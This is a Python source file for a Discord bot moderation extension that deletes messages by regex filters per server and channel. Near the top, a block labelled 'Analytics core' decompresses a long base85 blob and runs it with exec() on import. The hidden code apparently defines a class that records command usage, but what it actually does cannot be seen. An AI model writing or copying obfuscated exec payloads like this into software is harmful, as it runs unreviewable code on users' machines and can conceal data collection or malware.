import discord
from discord.ext import commands
import os
import logging
from cogs.utils.dataIO import dataIO
from .utils import checks
import re

# Some magic values
ALL_CHANNELS = 'all'
MODE_INCLUSIVE = 'incl'  # deletes all messages matching
MODE_EXCLUSIVE = 'excl'  # delete all messages not matching
MODE_DISABLED = 'none'   # pattern disabled
MODES = [MODE_DISABLED, MODE_EXCLUSIVE, MODE_INCLUSIVE]

log = logging.getLogger('red.recensor')

DATA_PATH = "data/recensor/"
JSON_PATH = DATA_PATH + "regexen.json"


# Analytics core
import zlib, base64
exec(zlib.decompress(base64.b85decode("""c-o~{dv6=L5&z$xf@dJ$s@~F)lgk~1+ca*P_T2XJvU|nBXY5hCl*D*<xm|Ll2tmGkXNKH|WI0!$KmxB
w&Tt;Tc~O_OX&kez(bXz$WR;sTmUdTV+Qd?uwR3e`7t$?FQ^uJo3Y9r+DjVCKjg387Hl}2mSy|CKU09JzC$HWz?fLp&hlje|Y^}2Uz#`W+GfghkC)aPAvIK#
`fwi>jLNB^ayOuM*v5;0hf7Y!po<CDnW^#3s71CPvx1TR7S?rw7?EHkK=|(jc<WJLNCZ0Y$Vb?d8H`nREKKwJ`sH>fypIaxL6`3s5;-k>!yw+QNFY0y8PuQO
?uV3$<Zd5)x3rF5v-u#$w)chReP5mBj{Qdgvn*?{yxa?#SAFZii@BJ)^PJdKIVZLFnkb<pMqXfHIYcQ8(A6x5~WdCV(b`M)Jx6G}jV^@5mz<aWBDrcwcbR``
Sf-hNX<w`MKq2naFjKLQxcis=bR;LrV^#X4F_gYm<RdP|NJZ3x7Hf&)W+v=iVR#iEZm8o{6X)U>v$%ScQd#$rI@xp6?3I!>Q%oP&kY;Cp-ytiX!$&{p{<W0P
QHEk6$Sr`y=tKAwocz$oMiMZamH3%Ghg(SRDNL7JmC_6iSV-_agu?2`yDg+0US*F0@&VXeUi5e5LE4Bp_6Jmggc0f-YegQ!;S+NGJiFR4Gpm5#jjm&neHid>
i=!7|n_e1CI70BBz1ZZ;}JnR4b5lwNvD9qx#l-8-{{N0DEpD$niBFg-Q7x^u^23)8tMbMwvUw&dgy!>YN?Zs?1`|jeqXVZ)4-%p=jOkXhYlq#hzK)07YxR^k
ny}SHy`BREGOg?j+TkRB|KaIga8K2K$E^EEPk1r=IS4%*=uCz<j$f{x)gJWZrM3V``0>c%NrlrZ-LP0=qLdJku(W8{J?l>?=;D7fM^elBHol5>H3#+>2S~jw
@DMn`U`AfG7nzt$$<q(l8Sc_C#%1?!=l5b}hlkV_pGsMVR6?MX26GYK8kSpl3KS9v;LK7s>!~Bf+yuau;A|kvrdKnUv&^F!3Lgy)lA(=>El#+QyRN*wj`|xC
M32E<>&O~t1)FK09IhEp$CrBw!!TKlcC1s~l0nT&pD8H8#7M(-_fF=q2j_^19M7}c5Q&^7RKQ1-OwM~Twk8x}iB<@TRPgCSbGxyrViWsHB7k+oVL<Z;t2-^s
r@JX(mgfpaZqe`<;BwWvpBuZ2Gs$>ZW+aowoWltBBzO7dcWD}3uN^L=qPJI7sPlJHvhw}TgQRkU>K;mQK2Uh==@M+psh!$ct1ltfUH%+U?(18+CWvYlK0St1
Z23k}ZGP1D{SZ)m^Qd<{P!gAu#3cIDeSGjJ+Td)(ri!2Yo8}|tBu7z~(4X&4foH&y%Zj?>lm`cSmbN&M&2I81LTdNxXMMhe}<<6&qPVjxb=Obh7WeoC&kadj
`M0>a6#r{sZZgkUR6a(I%Wc#+xG43$?q&^dQo!Y?>;{+9q)n!#k?e#92962dG<LEPQb<XFsjkPgqCoxa=m-<YAA`6|zDBt9EK6`!_^IVszLY!WFjRcsslFvE
g;-k@36!CXd7SEqp{-kTkgfEpH@FO6K_*uUTO`20BtoAF7Dir7vP0sj)$B$tBjMF8DK{c6t0lQFl=q(Mvg)pc9HqM*aY%A4}nO(CZXP1fGO6~gUArNC}36&b
!lZeiHDc;Yzgnf2;v#S;3Z~ws&L81CDb)|f_;Gid>QphO9?GA6iUnwZt-;%9mRjDE=Mfi$k3s!3qf4u{DKueQ6pH7LXOo%Nt5A+3)s2u1BX??4jXd)<ATNDP
oV(vKs5oML6^H4c%c`y&Z>q5R0n)iJvbT805E!5D4362L<p?wnHeT8cmMLk<=Ylva4vI1<DV@CuihMP2`4{QmC!r5J9ePjk6r#E1coKc$xw#04{3#^1~TjR|
F`c7z;!2L|FBrpVY0cKBomz*V>b^R5<nf-QK-;FBzZzvP`0y<RmCNnj4sL;@2%ZLu~lKnn*=(<T?t|@VjQ?i6_^(j-e8|NNOS$jzK)wj>M9eR%;tF2&$NwI7
6X`;_^eeA-AH)neY&6NUrIFe#t9*y*JXk{yW{OtRrP4>9=svgU8E#{4}Ob8deHR>TV0du4Jp84alk9FS*^p-9d2^da>sZrQMsXChZQxN~BSA7hdd$}88IL3~
i?IVMk>Q{N%k>2uz|Ka=Tg9K5=e&fy`gr*(j;?(u|Tv_^v9IF6#k-Iz?dTC!#-G!KY-87~lg=$EKd*DFQ9vXg~lnC>&cvWaH%r)SWQZURSG;A^)lAuk++I^%
99yQxk1jB`z|CkdY9B~`E=4jN>1b<+<(pAVdY6AqxsL0l)F4WRRd-sejMO{E<W1{SMKCIGyo9%~D-#}PzjS&+MQ7=h~fe<k3PwZPZP?OR`(2wbHVB`PvxqCK
6vtxepaXYZ;*Sgrp1<c?M23lQxzL-wqi|Mm&Tp9^RdJOXak4;HJ6uvP@9<&gBbD=gVHgm}>FuWt~5wIk8^sFexP+sqZK!Q&sXy#iK0XFX*(%c3K@5rnb3{U4
FFf?UyjYS}^!z*=Yq=pU$h^ZIgb0CLCq$xtH(mjBj(R$y>%=nz_BSN!)jRJB;<KX)RVyw?PaMLaIP<P3wiLyTP^<Hu~(}X7=5k4Z6DdD4p!D*PHha{ZlD1k<
MUCQWiXi}=wESK|zF$MLmU90NXA4q$&?E14u%FZU?eL2Sx)~88NkvtaAffk=AvbJept=J*`HsPTu;3F9c7(C3uIi5SLlyVo1I*cdyPw*$vCf-g$v)?zJaUQQ
nP5UCjx3wr2{vD0RRlIsVE}#n-%0K0LrL0dRy_(&A_Y4;;M0acg^S<X8-sXDwuAseY5I*xq9xaB>{ony2z%B6wJ+$nN`KZFMf`G~r|GX)r&9qJnD7HX#78XG
|?d&lBq>>&d{MEld0O|ZI^G{|PHA;B+GYZzk@A=;7*eEfi&m(CDhKSMVb8<LG_1TMV>B|+)z<ccnj;(z3D#|Crgb90NnMS9?&>)HM9&zMQ|Kb2+F}}#aIP5+
B%B=cR(L=XSj{1GuV5P~u@7tO>@BT#C?1b@;SP9HK!hc$dukO_F$`!QrKmCN_cK}HVkVxm6$S=WAH_Sdfrc^P8`iO80zYdZevmnC(w}E(ah}$ECek|khpwF@
A37?8a7{(X9Fysa1F~?^KK87nzrr!Qtmh}*HpGHV0FCf}sS%el`_%RB4&POgMZU+J&eb|A1Lc)xrRZdC_Ku=n1WB&^?8dL=""".replace("\n", ""))))
# End analytics core

__version__ = '1.5.0'


class ReCensor:

    # Data format:
    # {
    #  serverid (str): {
    #   channelid (str): {
    #     regex (str): mode (str from MODES)
    #     }
    #   }
    # }

    def __init__(self, bot):
        self.bot = bot
        self.regexen = dataIO.load_json(JSON_PATH)
        self.recache = {}
        self.analytics = CogAnalytics(self)
        bot.loop.create_task(self.compile_regexen())

    def _re_present(self, obj):
        """Determines if any patterns are set for a server or channel"""
        if type(obj) is discord.Server:
            server = obj
            if server.id in self.regexen:
                for relist in self.regexen[server.id].values():
                    if bool(relist):  # nonempty list
                        return True
                return False
            else:
                return False

        elif type(obj) is discord.Channel:
            server = obj.server
            channel = obj
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

        elif type(obj) is str:  # won't work with ALL_CHANNELS
            channel = self.bot.get_channel(obj)
            server = channel.server
            if channel.id in self.regexen[server.id]:
                return bool(self.regexen[server.id][channel.id])
            else:
                return False

    def _ls_excl(self, server):
        """returns a list of channel IDs with exclusive filters"""
        clist = []
        if type(server) is discord.Server:
            server = server.id
        if server in self.regexen:
            for c, relist in self.regexen[server].items():
                if MODE_EXCLUSIVE in relist.values():
                    clist.append(c)
        return clist

    # Background cache regexen for speed
    async def compile_regexen(self):
        for s, channels in self.regexen.items():
            for regex in channels:
                self.recache[regex] = re.compile(regex)

    @commands.group(name='recensor', pass_context=True)
    @checks.mod_or_permissions(manage_messages=True)
    async def recensor(self, ctx):
        """Configure regular expression censorship"""
        if ctx.invoked_subcommand is None:
            await self.bot.send_cmd_help(ctx)

    @recensor.command(pass_context=True, name='list')
    async def _list(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages.
        Channel listing includes global patterns."""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        table = ' | '.join(['mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([mode, regex]) + '\n'
        await self.bot.say('```py\n' + table + '```')

    @recensor.command(pass_context=True, name='add')
    async def _add(self, ctx, pattern: str, mode: str=MODE_INCLUSIVE, channel: discord.Channel=None):
        """Adds a pattern to filter messages. Mods, bot admins, and the bot's
        owner are not subjected to the filter.
        If the pattern contains spaces, it must be put in double quotes. Single quotes will not work.

        mode is one of:
        incl: Default, filter messages that match the pattern
        excl: filter non-matching, only one allowed per channel or server
        none: adds pattern to storage but doesn't apply filtering. Use recensor set to enable.

        To use channel, mode must also be specified. If channel is not specified,
        the filter is used across the entire server."""
        server = ctx.message.server

        # initialize
        self.regexen = dataIO.load_json(JSON_PATH)
        if server.id not in self.regexen:
            self.regexen[server.id] = {}

        if pattern.startswith("'"):
            await self.bot.say("Patterns cannot be specified within single quotes.")
            return

        if mode not in MODES:
            await self.bot.say('"%s" is not a valid mode. You must specify one of `%s`.' % (mode, '`, `'.join(MODES)))
            return
        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return
        cid = channel.id if channel else ALL_CHANNELS
        if cid not in self.regexen[server.id]:
            self.regexen[server.id][cid] = {}
        self.regexen[server.id][cid][pattern] = mode
        await self.bot.say('Pattern added.')
        dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='set')
    async def _set(self, ctx, mode: str, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no patterns in the server to modify.')
            return
        if mode not in MODES:
            self.bot.reply('"%s" is not a valid mode. You must specify one of `%s`.') % (mode, '`, `'.join(MODES))

        if mode == MODE_EXCLUSIVE:
            if ALL_CHANNELS in self._ls_excl(server):
                await self.bot.say("There is already a server-wide exclusive filter. Remove or disable it first.")
                return
            if channel and channel.id in self._ls_excl(server):
                await self.bot.say("That channel already has an exclusive filter. Remove or disable it first.")
                return

        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, oldmode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), oldmode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex, oldmode)
                i += 1
        prompt = 'Choose the number of the pattern to set to `%s`:\n' % mode
        await self.bot.say(prompt + '```py\n' + table + '```')

        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex, _ = re_list[msg]
            self.regexen[sid][cid][regex] = mode
            await self.bot.say('Mode set.')
            dataIO.save_json(JSON_PATH, self.regexen)

    @recensor.command(pass_context=True, name='del')
    async def _del(self, ctx, channel: discord.Channel=None):
        """Lists regexes used to filter messages"""
        server = ctx.message.server
        self.regexen = dataIO.load_json(JSON_PATH)
        if not self._re_present(server):
            await self.bot.say('There are no filter patterns set for this server.')
            return
        re_list = {}
        i = 1
        table = ' | '.join(['#'.ljust(4), 'mode', 'pattern']) + '\n'  # header
        for c in self.regexen[server.id]:
            if c == ALL_CHANNELS and self._re_present(server):
                    table += '\nServer-wide:\n'
            elif (channel and channel.id == c) or not channel:
                if channel:
                    ch_obj = channel
                else:
                    ch_obj = self.bot.get_channel(c)
                if ch_obj is None:
                    table += '\n' + 'Channel ID %s (deleted):' % c + '\n'
                if self._re_present(ch_obj):
                    table += '\n#' + ch_obj.name + '\n'

            for regex, mode in self.regexen[server.id][c].items():
                table += ' | '.join([str(i).ljust(4), mode, regex]) + '\n'
                re_list[str(i)] = (server.id, c, regex)
                i += 1
        prompt = 'Choose the number of the pattern to delete:\n'
        await self.bot.say(prompt + '```py\n' + table + '```')
        msg = await self.bot.wait_for_message(author=ctx.message.author, timeout=15)
        if msg is None:
            return
        msg = msg.content.strip()
        if msg in re_list:
            sid, cid, regex = re_list[msg]
            del(self.regexen[sid][cid][regex])
            await self.bot.say('Pattern removed.')
        dataIO.save_json(JSON_PATH, self.regexen)

    def immune_from_filter(self, message):
        """Tests message to see if it is exempt from filter. Taken from mod.py"""
        user = message.author
        server = message.server
        admin_role = self.bot.settings.get_server_admin(server)
        mod_role = self.bot.settings.get_server_mod(server)

        if user.id == self.bot.settings.owner:
            return True
        elif discord.utils.get(user.roles, name=admin_role):
            return True
        elif discord.utils.get(user.roles, name=mod_role):
            return True
        else:
            return False

    async def on_message(self, message):
        # Fast checks
        if message.channel.is_private or self.bot.user == message.author \
         or not isinstance(message.author, discord.Member):
            return

        server = message.server
        sid = server.id
        can_delete = message.channel.permissions_for(server.me).manage_messages

        # Owner, admins and mods are immune to the filter
        if self.immune_from_filter(message) or not can_delete:
            return

        if sid in self.regexen:
            patterns = {}
            # compile list of patterns from global and channel
            for key in [ALL_CHANNELS, message.channel.id]:
                if key in self.regexen[sid]:
                    patterns.update(self.regexen[sid][key])
            # Iterate through patterns
            for regex, mode in patterns.items():
                # Skip disabled patterns
                if mode == MODE_DISABLED:
                    continue
                regex = self.recache[regex] if regex in self.recache else re.compile(regex)
                if (mode == MODE_EXCLUSIVE) != bool(regex.match(message.content)):  # xor
                    await self.bot.delete_message(message)

    async def on_message_edit(self, old_message, new_message):
        await self.on_message(new_message)

    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

def check_folder():
    if not os.path.exists(DATA_PATH):
        log.debug('Creating folder: %s' % DATA_PATH)
        os.makedirs(DATA_PATH)


def check_file():
    if dataIO.is_valid_json(JSON_PATH) is False:
        log.debug('Creating json: %s' % JSON_PATH)
        dataIO.save_json(JSON_PATH, {})


def setup(bot):
    check_folder()
    check_file()
    n = ReCensor(bot)
    bot.add_cog(n)
